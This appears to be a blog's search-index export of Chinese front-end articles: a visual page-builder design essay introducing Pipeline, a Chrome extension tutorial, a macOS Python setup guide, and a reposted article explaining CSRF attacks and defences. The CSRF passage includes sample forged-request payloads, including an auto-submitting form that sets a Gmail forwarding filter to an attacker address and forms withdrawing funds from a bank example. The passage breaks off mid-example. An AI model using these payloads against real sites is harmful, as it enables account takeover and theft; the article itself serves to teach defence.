可以根据组件树声明动态渲染出组件, 而无需在构建前就定义好页面的组件树结构. 对动态组件页面实现可视化组件编辑时, 可以只编辑组件树声明文件, 然后将组件树声明传入提前打包好的页面中进行渲染. 采用动态组件可以避免重新打包的耗时, 快速生成新页面. Vue 根据组件树声明动态地渲染组件示例如下图, vue 动态组件使用 compontent 关键字来声明, 并通过 is 属性来决定实例化的具体组件. 对于 react, 组件是一个 js 对象, 直接在 jsx 中按照组件名称返回对应组件就可以了. 编辑页面内容组件化页面的页面内容编辑, 是对页面中各个组件的组件属性(Props)进行配置. 组件配置数据一个组件包含组件属性(Props), 组件状态(State), 组件HTML模板(Template), 组件业务逻辑(Javascript), 组件样式布局(Style)等几个部分. 组件的配置数据通过组件暴露的 Props 注入到组件中, 在组件内部 Props 作为常量分发给 State, Template, Javascript, Style 等其他组件内容, 由组件内容渲染出视图. 组件差异化组件是业务内容的呈现载体, 不同的业务内容, 封装在不同的业务组件中. 所以页面模板中的组件是差异化的, 差异点体现在组件的 Props, State, Template, Javascript, Style 等组件内容上. 在编辑不同组件内容时, 组件配置数据的数据结构是也是差异化的. 如下图示的页面包含3个组件: 头部组件, 间隔区组件和天气组件. 头部组件的配置数据为头部标题和头部图片等; 间隔去组件的配置数据为间隔提示文本等; 天气组件的配置数据为城市名称. 不同的组件需要不同的配置数据. 需要为各组件差异化的配置数据定义数据结构和字段类型, 理想的配置数据格式为 JSON, 因为其格式灵活, 支持数据嵌套, 且前端友好. 组件配置表单页面可视化搭建工具的主要使用人员是运营/产品, 如果让运营/产品人员直接编辑文本格式的组件配置数据, 操作不友好并且容易出错. 需提供可视化的编辑方式 – 使用 Form 表单来填入配置数据. Form 表单是页面中数据交互的基本形式, 非开发人员使用也没有技术门槛. 使用配置表单来填入配置数据有2个好处: 配置表单交互功能完善, 容易使用. 配置表单可以添加校验逻辑, 避免填入错误的配置数据. 如上图所示, 由于组件配置数据的差异化, 组件配置表单也是差异化的, 需为组件库中的每个组件提供相应的配置表单. 如果为每个组件都编写一个表单页面, 工作量较大; 对于复杂的配置项, 表单页面的编写工作量可能会大于页面组件的开发工作量. 需要重点考虑提供配置表单的方式. 技术难点2: 如何用最简单的方式生成配置数据编辑表单. 组件层级关系组件树定义了组件间父子兄弟的层级关系, 父子组件通过数据流和事件进行关联: 数据从父组件的 State 传递到子组件的 Props; 子组件的变更触发 Event 通知父组件. 层级关系对数据流和布局的影响页面可视化搭建工具编辑组件树时, 会修改组件数据流. 而不同组件的 Props 和 State 是异构的, 在编辑组件树时, 需要处理不同组件产生层级关系后对数据流的影响. 如下图, 父组件的 State 只包含子组件A的 Props, 将子组件B挂载为父组件的子组件, 父组件没有子组件B的 Props, 会导致无法渲染子组件B. 同理, 不同的组件有不同的样式布局, 编辑组件树时, 需要处理不同组件产生层级关系后带来的布局影响. 如下图, 一个父组件为行内组件, 给其添加一个块级组件作为子组件, 渲染后可能会导致行内组件被块级组件撑开. 所以设计页面可视化搭建工具的组件树编辑功能时, 需要重点关注组件树的层级关系, 解决组件间数据依赖和组件间布局适配问题. 页面可视化搭建工具需要制订组件嵌套的规则和约束, 通过组件嵌套规则来确保可视化编辑后的组件树正常渲染. 技术难点3: 如何组织页面组件的层级关系. 使用组件嵌套的搭建工具示例: 不嵌套的前端框架组件可以想象, 组件的嵌套会加大页面可视化搭建工具的架构设计和开发难度. 我们注意到, 营销活动的主要平台是移动端, 移动端页面的常用的布局策略是: 宽度铺满, 高度滚动. 如果前端框架组件都设置为铺满宽度, 页面展示时组件只需在浏览器垂直方向上顺序排列, 则组件组合时不需要嵌套 – 所有组件互为兄弟节点. 这种铺满页面宽度的组件, 非常适合搭建移动端页面的场景: 在承载页面逻辑的同时, 使得页面的编辑更加简单, 使用者只需处理组件的顺序, 无需处理组件的嵌套. 在移动端, 使用非嵌套组件层级规则的页面可视化搭建工具有: 阿里云凤蝶、pipeline 等. 阿里云凤蝶图示: 可视化搭建PC端中后台系统页面的工具, 同样可以采用不嵌套组件层级规则, 如阿里的飞冰: 页面预览页面实时预览是页面可视化搭建工具的必要部分, 使用人员可以在通过页面预览来查看和验证可视化编辑的效果. 页面预览示例: 用户的可视化编辑包括修改组件树和修改组件配置数据. 如下图, 用户修改页面后, 需要重新渲染页面组件, 得到新的预览页面. 实现页面预览有两种方式: 页面挂载和后台渲染. 页面挂载页面挂载指在编辑器前端页面的某个元素节点(div)上渲染出用户编辑的效果. 页面挂载流程图如下: 使用页面挂载的预览方式, 编辑器前端页面需要提供组件库组件渲染环境(组件库前端框架); 为实现前端渲染, 编辑器前端源码需引入组件库组件源码, 后续组件库更新, 编辑器需要同步更新. 页面挂载方式有以下特点: 实现页面预览技术方案可行, 实时渲染速度快. 为实现渲染, 编辑器的技术选型需和组件库前端框架一致. 编辑器源码和组件库源码耦合. 组件库组件渲染后的代码逻辑和样式布局, 可能会污染编辑器页面. 后台渲染后台渲染指在后台进行用户编辑结果页面的渲染和生成, 编辑器前端页面通过 iframe 加载和展示结果页面. 后台渲染流程图如下: 使用后台渲染的预览方式, 编辑器前端页面并不需要渲染组件库的组件; 甚至不需要组件源码, 只需知道各个组件的描述信息. 后台渲染有以下特点: 可以实现编辑器和组件库前端框架的分离. 可以实现编辑器和组件库各组件的分离. 可以避免预览页面的逻辑和样式污染编辑器环境. 要求后台和组件库提供页面后台渲染能力, 并要求后台渲染速度快, 用户需要”实时”预览. 难点4: 如何实现组件库的快速后台渲染, 从而实现编辑器和组件库前端框架的分离. 页面构建页面构建是组件化前端源码生成页面资源的必要环节: 在开发时需要进行开发构建来进行页面调试; 在可视化编辑后可能需要重新构建来生成预览页面; 在发布前需要进行生产构建. 在可视化搭建页面时需要“实时”预览, 要求页面页面构建效率高, 实现快速的构建和打包. 更进一步, 后台渲染其实和服务端渲染很像, 能否借鉴服务端渲染的技术思路. 自定义模板和组件开发页面可视化搭建工具在业务中的落地, 需要根据不同的业务场景进行业务组件和页面模板的自定义开发. 这对页面可视化搭建工具提出3个要求: 页面可视化搭建工具要支持业务现有的前端框架. 避免后续组件和模板自定义开发时的工作量和割裂感. 我们是希望复用现有前端框架组件, 而不是用另一个前端框架重写一遍. 组件和模板的编写方式需遵循较简单的编写约定, 避免开发人员难上手和写起来不舒服. 自定义模板和组件和在开发模式下进行调试和测试. 页面可视化搭建工具必然会对页面模板和页面组件的编码方式进行限定. 这要求就页面可视化工具在页面模板和页面组件上的约束较少, 减少对前端框架代码组织方式的入侵点. 理想的活动页面可视化搭建工具页面可视化搭建工具, 需要对页面做一些约定和约束, 在可视化搭建时遵循工具约定和约束来编辑页面. 从页面可视化搭建工具的技术要点中, 可以归纳出活动页面可视化搭建工具的理想形态. 页面可视化搭建工具有不同的框架设计和实现方式, 不同的功能有不同的适用场景, 详细分类可以参考笔者以前的文章: 页面可视化搭建工具前生今世. 概述运营页面搭建工具, 实现基于模板的页面生成; 将页面的逻辑功能封装在组件内, 声明页面配置数据并提供配置表单, 通过对配置表单的数据填充, 进行少量页面编辑就可以完成业务页面搭建. 不嵌套的组件在编辑自由度的选择上, 选用不嵌套的组件.各组件铺满页面宽度, 在页面高度方向顺序排列.解决组件嵌套带来的数据流问题. 不嵌套的组件如下图各个红框框起来的部分所示. 配置表单自动生成配置表单的作用是生成和约束 JSON 配置数据, 业界已有对 JSON 进行描述和自动生成表单的方案 – JSON Schema. 按照 JSON Schema 规范对 JSON 数据进行描述, 可以动态渲染出配置表单; 且 JSON Schema 可以对编辑后的数据做格式校验, 避免编辑错误. 这比编写一个表单页面更加简单和高效. JSON Schema 的语法并不是很精简, 云凤蝶的 Schema 语法 等方案更简洁, 但是云凤蝶的语法没有开源的表单生成库支持, 在开源实践上还是 JSON Schema 最佳. 理想活动页面搭建工具特点 采用组件化和页面模板实现页面生成效率的提升. 采用不嵌套的组件层级简化数据流和样式布局. 采用 JSON Schema 声明配置数据, 自动生成配置表单. 采用后台渲染, 使编辑系统与组件前端框架解耦. 在遵循编辑系统约定下, 组件可以自由拓展, 前端框架可以自由选择. 页面可视化搭建框架 Pipeline简介Pipeline 是一个开源的页面可视化搭建框架, 主要由笔者在维护. Pipeline 意为流水线, 期望 pipeline 像工厂流水线一样可以高效地组装活动页面. 所谓框架, 是它实现了页面可视化搭建的基本功能, 解决了页面可视化搭建的基本难点, 可以让开发者快速拥有页面搭建的能力, 并支持私有部署和二次开发. 项目信息: 项目地址: github.com/page-pipepl… 体验地址: page-pipepline.github.io/pipeline-ed… 项目文档: github.com/page-pipepl… 功能 Demo可视化编辑 如动图所示, pipeline 的可视化编辑能力有: 可视化修改页面全局配置, 如修改页面主题颜色. 可视化修改页面组件内容, 如修改组件的图片和替换组件文本. 实时预览页面编辑效果, 即刻获得搭建后的页面. 页面支持用户交互. 组件编辑 如动图所示, pipeline 的组件编辑能力有: 动态增删页面组件. 可视化的组件拖拽, 拖拽组件库组件插入到页面组件列表中. 组件可以包含业务逻辑(网络请求和用户交互). 支持的前端框架Pipeline 实现了编辑器和页面前端框架的分离, 可以支持不同的前端框架. 所谓支持的前端框架, 就是对某个前端框架按照 pipeline 的约束规则进行组件编辑方式和工程构建方式的改造, 使得前端框架页面可以在 pipeline 中可视化搭建. 目前已经支持 Vue, React, 和 Omi, 理论上可以支持任意前端框架. 框架特点 开源页面可视化搭建框架. 自定义页面可配置字段. 组件动态增减, 组件拖拽. 从页面模板快速生成业务页面. 模板工程/编辑器/后台服务解偶. 模板工程前端框架无关: 支持 vue 和 react 等. 支持自由拓展页面组件, 不限制组件样式布局, 接口调用等. 前端工程约束少, 不限制使用其他技术(Redux, SSR, UI库等). 与云凤蝶的对比阿里云凤蝶 是目前市场上可见中最棒的页面可视化搭建服务, pipeline 的很多方面和云凤蝶相似, 做个简单对比: 云凤蝶 pipeline 商业化解决方案, 直接可用 开源系统, 基础的页面搭建框架, 需要自行部署 生成的页面, 上传的图片等只能托管在阿里, 也限定域名 资源落地和周边功能需要自行搭建, 但是可以100%掌控所有资源 配置表单功能比较完善 配置表单比较基础, 需要提升 使用自定义的组件配置约束规则 使用通用的 JSON Schema 规范 模板前端框架采用 Nunjucks 前端框架采用没有约束, 已经支持 vue 和 react 等, 业务迁移成本低 隐藏了模板的构建处理过程, 提供制定的 IDE 采用 webpack 构建, 模板开发与正常前端项目开发一致 不支持自定义页面级别的配置项 支持自定义页面级别的配置项 总的来说: 云凤蝶是完整的商业化页面可视化搭建系统, 适合偏业务运营的公司; pipeline 是开源的页面可视化搭建框架, 适合需要自建页面可视化搭建系统且有技术人员支持的公司. 下一步工作 完善技术实现文档, 使用文档, 系统部署文档和模板开发文档. 提供对更多前端框架的支持. 提供更加丰富的可视化交互方式. 总结本文讨论了活动页面开发的痛点, 总结出页可视化搭建工具的7个技术要点和4个技术难点, 并整理出理想的运营页面可视化搭建工具, 最后介绍页面可视化搭建框架 pipeline. 行文仓促, 对页面可视化搭建话题或开源项目 pipeline 感兴趣, 欢迎讨论. References pipeline github.com/page-pipepl… 页面可视化搭建工具前生今世 github.com/CntChen/cnt… /15 Vue 2.0学习笔记：组件数据传递 www.w3cplus.com/vue/compone… 阿里云凤蝶 i.yunfengdie.com/]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Chrome 插件实践指南]]></title>
    <url>%2F2019%2F09%2F21%2FWeb%E5%89%8D%E7%AB%AF%2FChrome%20%E6%8F%92%E4%BB%B6%E5%AE%9E%E8%B7%B5%E6%8C%87%E5%8D%97%2F</url>
    <content type="text"><![CDATA[著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。 什么是 Chrome 插件众所周知，在 Chrome 的多进程架构中，包含这样几种进程： 浏览器主进程。 整个浏览器的主要进程，其他几个进程都是这个进程的子进程，由它来管理和调配；同时你所看到的浏览器的整个窗口，包含地址输入栏，书签栏这些东西也都是它来展示的； 渲染进程。 一般来说一个 Tab 标签页面就是一个渲染进程；每个渲染进程中会运行 Blink 布局引擎，V8 JavaScript 执行引擎等，单独服务于一个 Tab 标签页；运行在沙盒中无法访问系统资源。 插件进程。 一个插件单独存在于一个进程当中，同时为了安全性，运行在沙盒中限制其权限。 网络进程。 发起网络请求访问。 GPU 进程。 处理 GPU 渲染方面的任务。 Chrome 插件就是运行在 Chrome 浏览器中的拓展程序，所属浏览器插件进程。类似 Electron 是运用 Web 技术加 Electron 提供给我们的 API 开发，Chrome 插件其实就是运用 Web 技术和 Chrome 的 API 开发的能增强 Chrome 功能的 web 软件而已。Chrome Extension API 中已经列出了我们所有能用到的 API，Chrome 插件可以做到但不限于以下功能： 网络请求控制 自定义右键 网页中插入 CSS 、JavaScript 文件 管理书签 管理 cookie omnibox 管理 … 基本概念基本组成开发一个 Chrome 插件最常用最基本组成包括： manifest.json background script content script popup manifest.json1234567891011121314151617181920212223242526272829303132333435363738&#123; &quot;name&quot;: &quot;扩展名称&quot;, &quot;version&quot;: &quot;1.0.0&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;扩展描述&quot;, &quot;icons&quot; : &#123; // 扩展的icon &quot;16&quot; : &quot;icon.png&quot;, &quot;48&quot; : &quot;icon.png&quot;, &quot;128&quot; : &quot;icon.png&quot; &#125;, &quot;browser_action&quot;: &#123; // 程序图标会出现在地址栏右侧，若要出现在地址栏则写成 page_action &quot;default_title&quot;: &quot;日报工具&quot;, &quot;default_icon&quot;: &quot;icon.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;, &quot;background&quot;: &#123; // background 常驻 Chrome 后台的页面 &quot;scripts&quot;: [&quot;background.js&quot;] &#125;, &quot;content_scripts&quot;: [ // content_scripts 是在 Web 页面内运行的 javascript 脚本 &#123; &quot;matches&quot;: [ &quot;http://www.google.com/*&quot; ], &quot;css&quot;: [ &quot;custom.css&quot; ], &quot;js&quot;: [ &quot;custom.js&quot; ], &quot;all_frames&quot;: true, &quot;run_at&quot;: &quot;document_idle&quot; &#125; ], &quot;permissions&quot;: [ // 一些权限的配置 &quot;cookies&quot;, // cookie权限 &quot;notifications&quot; // 系统通知权限 ]&#125; background scriptbackground 可以理解为是一个常驻 Chrome 后台的页面，只要浏览器打开它就存在，Chrome 关闭它才关闭，一般把需要一直运行的全局的代码都放在 background 里。 content script在 Chrome 插件中使用 Content Scripts 有以下两种方式： 在 manifest.json 文件中声明 Content Scripts 12345678910111213&#123; &quot;version&quot;: &quot;0.0.1&quot;, &quot;name&quot;: &quot;welearnmore-content_scripts&quot;, &quot;manifest_version&quot;: 2, &quot;description&quot;: &quot;welearnmore&quot;, &quot;content_scripts&quot;: [ &#123; &quot;matches&quot;: [&quot;https://icepy.me/*&quot;], &quot;js&quot;: [&quot;content_scripts.js&quot;] &#125; ], &quot;content_security_policy&quot;: &quot;script-src &apos;self&apos; &apos;unsafe-eval&apos;; object-src &apos;self&apos;;&quot;&#125; 动态注入 Content Scripts 利用 chrome.tabs.executeScript 向页面动态注入一段 Content Scripts 。 12345chrome.runtime.onMessage.addListener(function(request, sender, sendResponse)&#123; chrome.tabs.create(&#123; url: &apos;https://icepy.me&apos;&#125;, function(tab)&#123; chrome.tabs.executeScript(tab.id, &#123;file: &apos;dynamic_content_scripts.js&apos;&#125;); &#125;);&#125;) popupPopup 就是一个普通的HTML文件，它可以包含任何内容，比如：HTML，CSS，JavaScript，与普通网页唯一的区别是，它显示在浏览器的右上角。 如果要开启 Popup 需在 manifest.json 文件中 配置入口文件 ： 123456789&#123; &quot;name&quot;: &quot;我的popup扩展程序&quot;, &quot;version&quot;: &quot;2.0&quot;, &quot;browser_action&quot;: &#123; &quot;default_title&quot;: &quot;popup action page&quot;, &quot;default_icon&quot;: &quot;img/logo.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;&#125; 通信机制content script =&gt; background123456789101112// 在 content-script 端发送消息chrome.runtime.sendMessege( message, function(response) &#123;…&#125;)// 在 background 端监听消息chrome.runtime.onMessege.addListener( function(request, sender, sendResponse) &#123; sendResponse(&apos;已收到消息：&apos;+JSON.stringify(request)) &#125;) background =&gt; content script一个插件里只有一个 background 环境，而 content-script 可以有多个（一个页面一个）。 123456789101112131415161718/** * 获取当前选项卡id * @param callback - 获取到id后要执行的回调函数 */function getCurrentTabId(callback) &#123; chrome.tabs.query(&#123;active: true, currentWindow: true&#125;, function (tabs) &#123; if (callback) &#123; callback(tabs.length ? tabs[0].id: null); &#125; &#125;);&#125;// 在 background 端发送消息chrome.tabs.sendMessage(tabId, message, function(response) &#123;...&#125;);// 在 content-script 端监听消息chrome.runtime.onMessege.addListener(function(request, sender, sendResponse) &#123; …&#125;) popup =&gt; backgroundpopup 与 background 通信，可以使用chrome.runtime.sendMessage和chrome.runtime.onMessage 123456// background.js 中，利用消息通信的机制，去打开一个tab，由 Popup 页面中的某个按钮来触发chrome.runtime.onMessage.addListener(function(request, sender, sendResponse)&#123; chrome.tabs.create(&#123; url: &apos;https://icepy.me&apos;&#125;, function(tab)&#123; chrome.tabs.executeScript(tab.id, &#123;file: &apos;dynamic_content_scripts.js&apos;&#125;); &#125;);&#125;) 在 popup 中也可以直接调用 background 里的方法： 12var bg = chrome.extension.getBackgroundPage();bg.dosomething(); // dosomething 是 background 中一个 method DNS 缓存清除插件开发目录结构123456./├─ manifest.json //扩展的配置项├─ Custom.js //自定义js脚本├─ Custom.css //自定义css样式├─ icon.png //扩展程序的icon└─ popup.html //扩展的展示弹窗 代码实现manifest.json123456789101112131415&#123; &quot;name&quot;: &quot;dns-clear&quot;, &quot;version&quot;: &quot;0.0.1&quot;, &quot;description&quot;: &quot;clear chrome dns cache&quot;, &quot;manifest_version&quot;: 2, &quot;browser_action&quot;: &#123; &quot;default_title&quot;: &quot;dns-clear&quot;, &quot;default_icon&quot;: &quot;img/logo.png&quot;, &quot;default_popup&quot;: &quot;popup.html&quot; &#125;, &quot;background&quot;: &#123; &quot;scripts&quot;: [&quot;background.js&quot;] &#125;, &quot;permissions&quot;: [&quot;nativeMessaging&quot;, &quot;tabs&quot;, &quot;background&quot;]&#125; popup1234567891011121314151617181920212223242526const CLEAR_DNS = &apos;clear dns&apos;;var bmmode = localStorage.getItem(&apos;bmmode&apos;);// optionvar checkbox = document.getElementById(&apos;clear-checkbox&apos;);checkbox.checked = bmmode === &apos;true&apos; ? &apos;checked&apos; : &apos;&apos;;checkbox.addEventListener(&apos;click&apos;, function() &#123; bmmode = this.checked; localStorage.setItem(&apos;bmmode&apos;, bmmode);&#125;);// 清除 dnsvar btn = document.getElementById(&apos;clear-btn&apos;);btn.addEventListener(&apos;click&apos;, function() &#123; chrome.runtime.sendMessage( &#123; action: CLEAR_DNS, bmmode: bmmode &#125;, response =&gt; &#123; // 处理 console.log(&apos;response&apos;, response); &#125; );&#125;); background12345678910111213141516171819202122232425262728293031323334const CLEAR_DNS = &apos;clear dns&apos;;const SOCKETS_URL = &apos;chrome://net-internals/#sockets&apos;;var tabs = chrome.tabs;chrome.runtime.onMessage.addListener((request, sender, sendResponse) =&gt; &#123; var action = request.action; var bmmode = request.bmmode; switch (action) &#123; case CLEAR_DNS: clearDns(bmmode); break; &#125;&#125;);function clearDns(bmmode) &#123; var bm = chrome.benchmarking; if (bm &amp;&amp; bmmode === &apos;true&apos;) &#123; bm.clearHostResolverCache(); bm.clearCache(); bm.closeConnections(); &#125; else &#123; tabs.query(&#123; url: SOCKETS_URL &#125;, function(tabArr) &#123; if (tabArr.length &gt; 0) &#123; tabs.update(tabArr[0].id, &#123; active: true &#125;, function() &#123; tabs.reload(); &#125;); &#125; else &#123; tabs.create(&#123; url: SOCKETS_URL, active: true &#125;, function() &#123; tabs.reload(); &#125;); &#125; &#125;); 安装调试加载完成后，可以看到 背景页，点击打开，就看到我们熟悉的调控台了。 参考文档 Chrome 官方文档 Chrome Extension 入门指南 一篇文章教你顺利入门和开发chrome扩展程序（插件） 说说Chrome插件从开发调试到打包发布]]></content>
      <categories>
        <category>Web前端</category>
      </categories>
      <tags>
        <tag>Web前端</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F16%2FPython%2FMacOS%20%E6%90%AD%E5%BB%BA%20Python%20%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[MacOS 搭建 Python 环境安装 Python31brew install python3 12Warning: python 3.7.4 is already installed, it&apos;s just not linkedYou can use `brew link python` to link this version. 1brew link python 1Linking /usr/local/Cellar/python/3.7.4... Error:Permission denied @ dir_s_mkdir - /usr/local/Frameworks 相应的路径下创建目录,并赋予相应的权限: 12sudo mkdir /usr/local/Frameworkssudo chown $(whoami):admin /usr/local/Frameworks 到这里我们就可以用如下命令来检查我们Python是否有安装成功。 1python3 --version Python3 和 Python2 的区别Python3 默认使用 utf-8，在处理中文的时候可以 减少很多编解码的问题，而 Python2 默认使用ascii；官方宣布 Python2 的支持将于 2020 年 1 月停止维护。 具体区别参考官方文档说明：Should I use Python 2 or Python 3 for my development activity?。 安装 pip3直接 sudo easy_install pip3 会报错： 12345678910sudo easy_install pip3Password:Searching for pip3Reading https://pypi.python.org/simple/pip3/Couldn&apos;t find index page for &apos;pip3&apos; (maybe misspelled?)Scanning index of all packages (this may take a while)Reading https://pypi.python.org/simple/No local packages or download links found for pip3error: Could not find suitable distribution for Requirement.parse(&apos;pip3&apos;) 安装 Python3 时其实会自动安装 pip3，操作如下： 12brew install python3brew postinstall python3 安装虚拟环境 在开发 Python 应用程序的时候，系统安装的 Python3 只有一个版本，比如 3.7.4，所有第三方的包都会被 pip 安装到 Python3 的 site-packages 目录下。 如果我们要同时开发多个应用程序，那这些应用程序都会共用一个 Python，就是安装在系统的Python 3。如果应用 A 需要 jinja 2.7，而应用 B 需要 jinja 2.6 怎么办？ 这种情况下，每个应用可能需要各自拥有一套“独立”的 Python 运行环境。virtualenv 就是用来为一个应用创建一套“隔离”的 Python 运行环境。 安装 virtualenv 1sudo pip3 install virtualenv 安装virtualenvwrapper virtaulenvwrapper是virtualenv的扩展包，可以更方便地新增，删除，复制，切换虚拟环境。 1sudo pip3 install virtualenvwrapper 创建文件夹workspaces存放虚拟环境 12mkdir ~/workspacescd ~/workspaces 打开终端shell配置文件写入配置路径 1open ~/.zshrc 追加 12345# 设置virtualenvwrapperexport WORKON_HOME=~/workspacesexport VIRTUALENVWRAPPER_PYTHON=/usr/local/bin/python3# 打开终端自动启用source /usr/local/bin/virtualenvwrapper.sh 编译 1source ~/.zshrc 创建虚拟环境 1mkvirtualenv test --python=python3 lsvirtualenv 查看所有虚拟环境 workon 在项目底下激活虚拟环境 1workon test deactivate 退出环境 rmvirtualenv 删除环境 1rmvirtualenv test 更多指令可以在 shell 中输入 virtualenv 回车会有提示 virtualenv 原理virtualenv 是如何创建“独立”的 Python 运行环境的呢？原理很简单，就是把系统 Python 复制一份到virtualenv 的环境，用命令 source venv/bin/activate 进入一个 virtualenv 环境时，virtualenv 会修改相关环境变量，让命令 python 和 pip 均指向当前的 virtualenv 环境。 AnacondaAnaconda （巨蟒）是 Python 的一个发行版，如果把 Python 比作 Linux，那么 Anancoda 就是 CentOS 或者 Ubuntu。它解决了Python开发者的两大痛点。 第一：提供包管理，功能类似于 pip，Windows 平台安装第三方包经常失败的场景得以解决。 第二：提供虚拟环境管理，功能类似于 virtualenv，解决了多版本 Python 并存问题。 具体安装参考 完美解决 Python2 和 python3 共存问题的Anaconda 安装 mysql 打开 mysql 官网 点击下方的 DOWNLOADS : MySQL Community Server ，安装。 打开 zshrc 追加环境变量 1PATH=$PATH:/usr/local/mysql/bin 参考文章 virtualenv pip]]></content>
  </entry>
  <entry>
    <title><![CDATA[前端安全系列（二）：如何防止CSRF攻击？]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[转载自美团技术团队，作者刘烨，原文链接：https://tech.meituan.com/2018/10/11/fe-security-csrf.html 背景随着互联网的高速发展，信息安全问题已经成为企业最为关注的焦点之一，而前端又是引发企业安全问题的高危据点。在移动互联网时代，前端人员除了传统的 XSS、CSRF 等安全问题之外，又时常遭遇网络劫持、非法调用 Hybrid API 等新型安全问题。当然，浏览器自身也在不断在进化和发展，不断引入 CSP、Same-Site Cookies 等新技术来增强安全性，但是仍存在很多潜在的威胁，这需要前端技术人员不断进行“查漏补缺”。 前端安全近几年，美团业务高速发展，前端随之面临很多安全挑战，因此积累了大量的实践经验。我们梳理了常见的前端安全问题以及对应的解决方案，将会做成一个系列，希望可以帮助前端同学在日常开发中不断预防和修复安全漏洞。本文是该系列的第二篇。 今天我们讲解一下 CSRF，其实相比XSS，CSRF的名气似乎并不是那么大，很多人都认为“CSRF不具备那么大的破坏性”。真的是这样吗？接下来，我们还是有请小明同学再次“闪亮”登场。 CSRF攻击CSRF漏洞的发生相比XSS，CSRF的名气似乎并不是那么大，很多人都认为CSRF“不那么有破坏性”。真的是这样吗？ 接下来有请小明出场~~ 小明的悲惨遭遇这一天，小明同学百无聊赖地刷着Gmail邮件。大部分都是没营养的通知、验证码、聊天记录之类。但有一封邮件引起了小明的注意： 甩卖比特币，一个只要998！！ 聪明的小明当然知道这种肯定是骗子，但还是抱着好奇的态度点了进去（请勿模仿）。果然，这只是一个什么都没有的空白页面，小明失望的关闭了页面。一切似乎什么都没有发生…… 在这平静的外表之下，黑客的攻击已然得手。小明的Gmail中，被偷偷设置了一个过滤规则，这个规则使得所有的邮件都会被自动转发到hacker@hackermail.com。小明还在继续刷着邮件，殊不知他的邮件正在一封封地，如脱缰的野马一般地，持续不断地向着黑客的邮箱转发而去。 不久之后的一天，小明发现自己的域名已经被转让了。懵懂的小明以为是域名到期自己忘了续费，直到有一天，对方开出了 $650 的赎回价码，小明才开始觉得不太对劲。 小明仔细查了下域名的转让，对方是拥有自己的验证码的，而域名的验证码只存在于自己的邮箱里面。小明回想起那天奇怪的链接，打开后重新查看了“空白页”的源码： 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; 这个页面只要打开，就会向Gmail发送一个post请求。请求中，执行了“Create Filter”命令，将所有的邮件，转发到“hacker@hackermail.com”。 小明由于刚刚就登陆了Gmail，所以这个请求发送时，携带着小明的登录凭证（Cookie），Gmail的后台接收到请求，验证了确实有小明的登录凭证，于是成功给小明配置了过滤器。 黑客可以查看小明的所有邮件，包括邮件里的域名验证码等隐私信息。拿到验证码之后，黑客就可以要求域名服务商把域名重置给自己。 小明很快打开Gmail，找到了那条过滤器，将其删除。然而，已经泄露的邮件，已经被转让的域名，再也无法挽回了…… 以上就是小明的悲惨遭遇。而“点开一个黑客的链接，所有邮件都被窃取”这种事情并不是杜撰的，此事件原型是2007年Gmail的CSRF漏洞： https://www.davidairey.com/google-Gmail-security-hijack/ 当然，目前此漏洞已被Gmail修复，请使用Gmail的同学不要慌张。 什么是CSRFCSRF（Cross-site request forgery）跨站请求伪造：攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。 一个典型的CSRF攻击有着如下的流程： 受害者登录a.com，并保留了登录凭证（Cookie）。 攻击者引诱受害者访问了b.com。 b.com 向 a.com 发送了一个请求：a.com/act=xx。浏览器会默认携带a.com的Cookie。 a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。 a.com以受害者的名义执行了act=xx。 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作。 几种常见的攻击类型GET类型的CSRF GET类型的CSRF利用非常简单，只需要一个HTTP请求，一般会这样利用： 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) 在受害者访问含有这个img的页面后，浏览器会自动向http://bank.example/withdraw?account=xiaoming&amp;amount=10000&amp;for=hacker发出一次HTTP请求。bank.example就会收到包含受害者登录信息的一次跨域请求。 POST类型的CSRF 这种类型的CSRF利用起来通常使用的是一个自动提交的表单，如： 123456 &lt;form action="http://bank.example/withdraw" method=POST&gt; &lt;input type="hidden" name="account" value="xiaoming" /&gt; &lt;input type="hidden" name="amount" value="10000" /&gt; &lt;input type="hidden" name="for" value="hacker" /&gt;&lt;/form&gt;&lt;script&gt; document.forms[0].submit(); &lt;/script&gt; 访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。 POST类型的攻击通常比GET要求更加严格一点，但仍并不复杂。任何个人网站、博客，被黑客上传页面的网站都有可能是发起攻击的来源，后端接口不能将安全寄托在仅允许POST上面。 链接类型的CSRF 链接类型的CSRF并不常见，比起其他两种用户打开页面就中招的情况，这种需要用户点击链接才会触发。这种类型通常是在论坛中发布的图片中嵌入恶意链接，或者以广告的形式诱导用户中招，攻击者通常会以比较夸张的词语诱骗用户点击，例如： 123&lt;a 